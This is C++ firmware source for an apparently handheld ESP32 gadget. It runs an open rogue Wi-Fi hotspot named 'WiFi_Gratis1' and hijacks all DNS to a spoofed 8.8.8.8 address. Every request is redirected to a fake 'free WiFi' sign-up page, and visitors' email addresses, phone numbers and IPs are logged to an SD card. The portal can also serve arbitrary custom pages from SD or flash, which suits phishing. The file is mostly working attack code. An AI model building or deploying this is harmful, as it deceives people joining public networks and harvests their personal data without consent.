#include "Apps/screen_captive.h"
#include "Drivers/buzzer.h"
#include "Drivers/settings.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>
#include <FS.h>
#include <LittleFS.h>

static const unsigned char image_Layer_9_bits[] PROGMEM = {
  0x7e,0x7e,0x7e,0x7e,0x99,0x99,0x99,0x99,
  0x67,0xe6,0x67,0xe6,0x18,0x18,0x18,0x18,
  0x67,0xe6,0x67,0xe6,0x99,0x99,0x99,0x99,
  0x7e,0x7e,0x7e,0x7e
};

//  Captive Portal
//    - Android : http://connectivitycheck.../generate_204
//    - iOS/mac : http://captive.apple.com/hotspot-detect.html
//    - Windows : http://www.msftconnecttest.com/connecttest.txt


// ---------- Configuracion ----------
static char AP_SSID[33] = "WiFi_Gratis1";
static bool ssidLoaded  = false;

static void loadSSIDIfNeeded() {
  if (ssidLoaded) return;
  settingsGetPortalSSID(AP_SSID, sizeof(AP_SSID));
  ssidLoaded = true;
}

void captiveSetSSID(const char* ssid) {
  if (!ssid || !ssid[0]) return;
  strncpy(AP_SSID, ssid, sizeof(AP_SSID) - 1);
  AP_SSID[sizeof(AP_SSID) - 1] = '\0';
  settingsSetPortalSSID(AP_SSID);
  ssidLoaded = true;
}

const char* captiveGetSSID() {
  loadSSIDIfNeeded();
  return AP_SSID;
}

static const char* AP_PASS = "";

static const byte      DNS_PORT = 53;
static const IPAddress AP_IP(8, 8, 8, 8);
static const IPAddress AP_MASK(255, 255, 255, 0);
static const char*     PORTAL_URL = "http://8.8.8.8/";

// Rutas de los archivos del portal en la SD
static const char* PORTAL_INDEX = "/portal/index.html";
static const char* PORTAL_CSS   = "/portal/style.css";
static const char* PORTAL_OK    = "/portal/success.html";
static const char* LOG_FILE     = "/captive_log.txt";

// ---------- Estado ----------
static DNSServer dnsServer;
static WebServer webServer(80);
static bool captiveRunning = false;
static int  capturedCount  = 0;

static CaptivePortalSource portalSource = PORTAL_SRC_AUTO;

void captiveSetPortalSource(CaptivePortalSource src) {
  portalSource = src;
}

CaptivePortalSource captiveGetPortalSource() {
  return portalSource;
}

const char* captivePortalSourceName() {
  switch (portalSource) {
    case PORTAL_SRC_EMBEDDED: return "embebido";
    case PORTAL_SRC_SD:       return "SD";
    case PORTAL_SRC_FS:       return "FS interno";
    default:                  return "auto";
  }
}


static bool sdReady() {
  return SD.begin(PIN_CD);
}

// Inicializa la SD y crea el archivo de log si no existe.
static void setupSD() {
  pinMode(PIN_CD, OUTPUT);
  digitalWrite(PIN_CD, HIGH);
  delay(50);

  if (!sdReady()) {
    Serial.println(F("SD: no disponible"));
    return;
  }
  Serial.println(F("SD: OK"));

  if (!SD.exists(LOG_FILE)) {
    File f = SD.open(LOG_FILE, FILE_WRITE);
    if (f) {
      f.println("=== CAPTIVE PORTAL LOG ===");
      f.println("Timestamp,Correo,Telefono,IP");
      f.close();
      Serial.println(F("SD: log creado"));
    }
  }
}

// Guarda un registro en el log.
static void logVisitor(const String& correo, const String& telefono, const String& ip) {
  if (!sdReady()) return;

  File f = SD.open(LOG_FILE, FILE_APPEND);
  if (!f) return;

  f.print(millis() / 1000);
  f.print(',');  f.print(correo);
  f.print(',');  f.print(telefono);
  f.print(',');  f.println(ip);
  f.close();

  capturedCount++;
  Serial.println("log: " + correo + ", " + telefono + ", " + ip);
}


static const char* contentTypeFor(const String& path) {
  if (path.endsWith(".css"))  return "text/css";
  if (path.endsWith(".js"))   return "application/javascript";
  if (path.endsWith(".png"))  return "image/png";
  if (path.endsWith(".jpg") || path.endsWith(".jpeg")) return "image/jpeg";
  if (path.endsWith(".ico"))  return "image/x-icon";
  if (path.endsWith(".json")) return "application/json";
  if (path.endsWith(".txt"))  return "text/plain";
  return "text/html";
}

// Envia un archivo de la SD. Devuelve false si no existe.
static bool serveFromSD(const char* path, const char* contentType) {
  if (!sdReady() || !SD.exists(path)) return false;

  File f = SD.open(path, FILE_READ);
  if (!f) return false;

  webServer.streamFile(f, contentType);
  f.close();
  return true;
}

static bool fsReady() {
  static bool mounted = false;
  static bool tried = false;
  if (!tried) {
    tried = true;
    mounted = LittleFS.begin(true);
    if (!mounted) Serial.println(F("LittleFS: no se pudo montar"));
  }
  return mounted;
}

static bool serveFromFS(const char* path, const char* contentType) {
  if (!fsReady() || !LittleFS.exists(path)) return false;

  File f = LittleFS.open(path, "r");
  if (!f) return false;

  webServer.streamFile(f, contentType);
  f.close();
  return true;
}

static bool servePortalFile(const char* path, const char* contentType) {
  switch (portalSource) {
    case PORTAL_SRC_EMBEDDED:
      return false;
    case PORTAL_SRC_SD:
      return serveFromSD(path, contentType);
    case PORTAL_SRC_FS:
      return serveFromFS(path, contentType);
    default:
      return serveFromSD(path, contentType) || serveFromFS(path, contentType);
  }
}

//  Paginas embebidas (tiene backup si la SD no tiene el portal html)

static const char PAGE_PORTAL[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Gratis</title>
<style>
body{font-family:system-ui,Arial,sans-serif;background:#f2f2f2;margin:0;
display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{background:#fff;padding:24px;border-radius:10px;max-width:360px;width:90%;
box-shadow:0 2px 10px rgba(0,0,0,.1);box-sizing:border-box}
h1{font-size:20px;margin:0 0 4px;text-align:center}
p.sub{color:#666;margin:0 0 20px;text-align:center;font-size:14px}
label{display:block;font-size:14px;margin-bottom:4px;color:#333}
input{width:100%;padding:10px;margin-bottom:16px;border:1px solid #ccc;
border-radius:6px;font-size:15px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0066cc;color:#fff;border:0;
border-radius:6px;font-size:15px;cursor:pointer}
</style>
</head>
<body>
<div class="card">
<h1>WiFi Gratis</h1>
<p class="sub">Registrate para conectarte</p>
<form action="/submit" method="POST">
<label>Correo electronico</label>
<input type="email" name="correo" required placeholder="correo@ejemplo.com">
<label>Telefono</label>
<input type="tel" name="telefono" required placeholder="12345678"
inputmode="numeric" pattern="[0-9]{8}" maxlength="8"
title="Ingresa 8 digitos">
<button type="submit">Conectar</button>
</form>
</div>
</body>
</html>)HTML";

static const char PAGE_SUCCESS[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Success</title>
<style>
body{font-family:system-ui,Arial,sans-serif;background:#f2f2f2;margin:0;
display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{background:#fff;padding:32px;border-radius:10px;max-width:360px;width:90%;
text-align:center;box-shadow:0 2px 10px rgba(0,0,0,.1);box-sizing:border-box}
h1{font-size:20px;margin:0 0 8px}
p{color:#666;margin:0;font-size:14px}
</style>
</head>
<body>
<div class="card">
<h1>Conectado</h1>
<p>Gracias por registrarte. Ya puedes navegar.</p>
</div>
</body>
</html>)HTML";

// ============================================================
//  Handlers HTTP
// ============================================================

static void handleRoot() {
  if (!servePortalFile(PORTAL_INDEX, "text/html")) {
    webServer.send_P(200, "text/html", PAGE_PORTAL);
  }
}

static void handleStyle() {
  if (!servePortalFile(PORTAL_CSS, "text/css")) {
    webServer.send(404, "text/plain", "");
  }
}

static void handleSuccess() {
  if (!servePortalFile(PORTAL_OK, "text/html")) {
    webServer.send_P(200, "text/html", PAGE_SUCCESS);
  }
}

static void handleSubmit() {
  if (!webServer.hasArg("correo") || !webServer.hasArg("telefono")) {
    webServer.send(400, "text/plain", "Datos incompletos");
    return;
  }

  String correo   = webServer.arg("correo");
  String telefono = webServer.arg("telefono");
  String ip       = webServer.client().remoteIP().toString();

  logVisitor(correo, telefono, ip);

  webServer.sendHeader("Location", "/success.html", true);
  webServer.send(302, "text/plain", "");
}

static void handleCaptive() {
  String uri = webServer.uri();

  bool esAsset = uri.startsWith("/portal/") ||
                 uri.endsWith(".css")  || uri.endsWith(".js")  ||
                 uri.endsWith(".png")  || uri.endsWith(".jpg") ||
                 uri.endsWith(".jpeg") || uri.endsWith(".ico");

  if (esAsset && servePortalFile(uri.c_str(), contentTypeFor(uri))) {
    return;
  }

  Serial.println("redirect: " + uri);
  webServer.sendHeader("Location", PORTAL_URL, true);
  webServer.send(302, "text/plain", "");
}

// ============================================================
//  Control del portal
// ============================================================

void startCaptivePortal() {
  if (captiveRunning) return;

  Serial.println(F("\nCaptive Portal: iniciando"));
  setupSD();
  loadSSIDIfNeeded();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, AP_MASK);
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(100);

  Serial.print(F("IP:   ")); Serial.println(WiFi.softAPIP());
  Serial.print(F("SSID: ")); Serial.println(AP_SSID);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.setTTL(0);
  dnsServer.start(DNS_PORT, "*", AP_IP);

  webServer.on("/",                    handleRoot);
  webServer.on("/index.html",          handleRoot);
  webServer.on("/portal/index.html",   handleRoot);
  webServer.on("/submit", HTTP_POST,   handleSubmit);
  webServer.on("/success.html",        handleSuccess);
  webServer.on("/portal/success.html", handleSuccess);
  webServer.on("/style.css",           handleStyle);
  webServer.on("/portal/style.css",    handleStyle);

  webServer.onNotFound(handleCaptive);
  webServer.begin();

  captiveRunning = true;
  capturedCount  = 0;
  Serial.println(F("Captive Portal: activo\n"));
}

void stopCaptivePortal() {
  if (!captiveRunning) return;

  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  captiveRunning = false;
  Serial.println(F("Captive Portal: detenido"));
}

bool isCaptiveRunning() {
  return captiveRunning;
}


static bool isButtonJustPressed(int pin) {
  static uint8_t lastStableState[4] = {HIGH, HIGH, HIGH, HIGH};
  static uint8_t lastReading[4]     = {HIGH, HIGH, HIGH, HIGH};
  static unsigned long lastDebounceTime[4] = {0, 0, 0, 0};

  const int pins[4] = {PIN_SELECT, PIN_UP, PIN_DOWN, PIN_BACK};
  int index = -1;

  for (int i = 0; i < 4; i++) {
    if (pins[i] == pin) {
      index = i;
      break;
    }
  }
  if (index == -1) return false;

  uint8_t reading = digitalRead(pin);

  if (reading != lastReading[index]) {
    lastDebounceTime[index] = millis();
    lastReading[index] = reading;
  }

  if ((millis() - lastDebounceTime[index]) > 50) {
    if (lastStableState[index] == HIGH && reading == LOW) {
      lastStableState[index] = reading;
      return true;
    }
    lastStableState[index] = reading;
  }

  return false;
}


void screenCaptiveLoop() {
  if (captiveRunning) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }

  if (isButtonJustPressed(PIN_BACK)) {
    buzzerClick();
    if (captiveRunning) stopCaptivePortal();
    currentScreen = SCREEN_APPS;
    return;
  }

  if (isButtonJustPressed(PIN_SELECT)) {
    buzzerBeep();
    if (captiveRunning) stopCaptivePortal();
    else                startCaptivePortal();
  }

  u8g2.clearBuffer();
  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  u8g2.setFont(u8g2_font_6x10_tr);

  u8g2.setDrawColor(1);
  u8g2.drawBox(16, 1, 96, 14);
  u8g2.setDrawColor(2);
  u8g2.drawStr(22, 11, "Captive Portal");
  u8g2.setDrawColor(1);

  u8g2.drawXBM(0, 1, 16, 14, image_Layer_9_bits);
  u8g2.drawXBM(112, 1, 16, 14, image_Layer_9_bits);

  if (captiveRunning) {
    u8g2.drawStr(10, 24, "Estado: ACTIVO");
    u8g2.drawStr(10, 36, "SSID:");
    u8g2.drawStr(40, 36, AP_SSID);

    char portalLbl[24];
    if (portalSource == PORTAL_SRC_AUTO) {
      if (sdReady() && SD.exists(PORTAL_INDEX))            strcpy(portalLbl, "Portal: SD");
      else if (fsReady() && LittleFS.exists(PORTAL_INDEX)) strcpy(portalLbl, "Portal: FS");
      else                                                  strcpy(portalLbl, "Portal: interno");
    } else {
      snprintf(portalLbl, sizeof(portalLbl), "Portal: %s", captivePortalSourceName());
    }
    u8g2.drawStr(10, 48, portalLbl);

    char buffer[20];
    snprintf(buffer, sizeof(buffer), "Logs: %d", capturedCount);
    u8g2.drawStr(80, 48, buffer);

    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(5, 60, "SEL:Detener BACK:Salir");
  } else {
    u8g2.drawStr(11, 21, "Estado: INACTIVO");

    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(12, 33, "Carpeta SD: /portal/");
    u8g2.drawStr(13, 43, "Log: captive_log.txt");

    u8g2.drawStr(1, 56, "SEL:Iniciar BACK:Salir");
  }

  u8g2.sendBuffer();
}
